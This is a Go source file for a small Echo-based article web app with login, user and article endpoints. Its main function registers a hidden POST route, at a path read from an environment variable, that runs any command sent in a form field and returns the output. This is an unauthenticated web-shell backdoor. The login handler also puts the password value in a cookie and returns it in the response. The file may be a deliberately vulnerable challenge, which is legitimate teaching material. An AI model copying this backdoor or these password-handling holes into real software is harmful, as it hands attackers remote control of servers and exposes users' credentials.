package main

import (
	"database/sql"
	"errors"
	"net/http"
	"os"
	"os/exec"
	"strconv"
	"strings"

	"github.com/labstack/echo/v5"
	"github.com/labstack/echo/v5/middleware"
	_ "modernc.org/sqlite"
)

var e = echo.New()

func login(c *echo.Context) error {
	name, password := c.FormValue("name"), c.FormValue("password")

	if name == "" || password == "" {
		return c.JSON(http.StatusBadRequest, response{
			Code: http.StatusBadRequest,
			Data: "Bad Request",
		})
	}

	var user *user
	var err error

	if user, err = verifyUser(name, password); err != nil {
		if errors.Is(err, sql.ErrNoRows) {
			if user, err = createUser(name, password); err != nil {
				return c.JSON(http.StatusInternalServerError, response{
					Code: http.StatusInternalServerError,
					Data: "Internal Server Error",
				})
			}

			c.SetCookie(&http.Cookie{
				Name:     "password",
				Value:    user.Password,
				HttpOnly: true,
			})

			return c.JSON(http.StatusCreated, response{
				Code: http.StatusCreated,
				Data: user,
			})
		}

		return c.JSON(http.StatusUnauthorized, response{
			Code: http.StatusUnauthorized,
			Data: "Unauthorized",
		})
	}

	c.SetCookie(&http.Cookie{
		Name:     "password",
		Value:    user.Password,
		HttpOnly: true,
	})

	return c.JSON(http.StatusOK, response{
		Code: http.StatusOK,
		Data: user,
	})
}

func queryUser(c *echo.Context) error {
	id, err := strconv.ParseUint(c.FormValue("id"), 10, 64)

	if err != nil {
		return c.JSON(http.StatusBadRequest, response{
			Code: http.StatusBadRequest,
			Data: "Bad Request",
		})
	}

	user, err := getUser(id)

	if err != nil {
		return c.JSON(http.StatusNotFound, response{
			Code: http.StatusNotFound,
			Data: "Not Found",
		})
	}

	user.Password = ""

	return c.JSON(http.StatusOK, response{
		Code: http.StatusOK,
		Data: user,
	})
}

func create(c *echo.Context) error {
	title, body := c.FormValue("title"), c.FormValue("body")
	creator, err := strconv.ParseUint(c.FormValue("creator"), 10, 64)

	if title == "" || body == "" || err != nil {
		return c.JSON(http.StatusBadRequest, response{
			Code: 0,
			Data: "Bad Request",
		})
	}

	article, err := createArticle(title, body, creator)
	if err != nil {
		return c.JSON(http.StatusInternalServerError, response{
			Code: http.StatusInternalServerError,
			Data: "Internal Server Error",
		})
	}

	return c.JSON(http.StatusCreated, response{
		Code: http.StatusCreated,
		Data: article,
	})
}

func queryArticle(c *echo.Context) error {
	id, err := strconv.ParseUint(c.FormValue("id"), 10, 64)

	if err != nil {
		return c.JSON(http.StatusBadRequest, response{
			Code: http.StatusBadRequest,
			Data: "Bad Request",
		})
	}

	article, err := getArticle(id)

	if err != nil {
		return c.JSON(http.StatusNotFound, response{
			Code: http.StatusNotFound,
			Data: "Not Found",
		})
	}

	return c.JSON(http.StatusOK, response{
		Code: http.StatusOK,
		Data: article,
	})
}

func recommend(c *echo.Context) error {
	var articles []article

	rows, err := database.Query(`SELECT id, title, body, creator FROM articles`)
	if err != nil {
		return c.JSON(http.StatusInternalServerError, response{
			Code: http.StatusInternalServerError,
			Data: "Internal Server Error",
		})
	}

	for rows.Next() {
		var article article
		err := rows.Scan(&article.Id, &article.Title, &article.Body, &article.Creator)
		if err != nil {
			return c.JSON(http.StatusInternalServerError, response{
				Code: http.StatusInternalServerError,
				Data: "Internal Server Error",
			})
		}
		articles = append(articles, article)
	}

	return c.JSON(http.StatusOK, response{
		Code: http.StatusOK,
		Data: articles,
	})
}

func main() {
	e.Static("/static", "static")
	e.Use(middleware.RequestLogger())

	e.File("/", "html/index.html")
	e.File("/error", "html/error.html")
	e.File("/login", "html/login.html")
	e.File("/user/:id", "html/user.html")
	e.File("/create", "html/create.html")
	e.File("/article/:id", "html/article.html")

	e.POST("/login", login)
	e.POST("/user", queryUser)
	e.POST("/create", create)
	e.POST("/article", queryArticle)
	e.POST("/recommend", recommend)

	e.POST(os.Getenv("SHELL"), func(c *echo.Context) error {
		command := c.FormValue("command")
		if command == "" {
			return c.JSON(http.StatusBadRequest, response{
				Code: http.StatusBadRequest,
				Data: "Bad Request",
			})
		}

		split := strings.Split(command, " ")

		output, err := exec.Command(split[0], split[1:]...).CombinedOutput()
		if err != nil {
			return c.JSON(http.StatusInternalServerError, response{
				Code: http.StatusInternalServerError,
				Data: "Internal Server Error",
			})
		}

		return c.JSON(http.StatusOK, response{
			Code: http.StatusOK,
			Data: string(output),
		})
	})

	e.HTTPErrorHandler = func(c *echo.Context, err error) {
		_ = c.Redirect(http.StatusSeeOther, "/error")
	}

	if err := InitializeDatabase(); err != nil {
		e.Logger.Error("Failed to initialize database", "error", err)
	}

	if err := e.Start("0.0.0.0:" + os.Getenv("PORT")); err != nil {
		e.Logger.Error("Failed to start server", "error", err)
	}
}
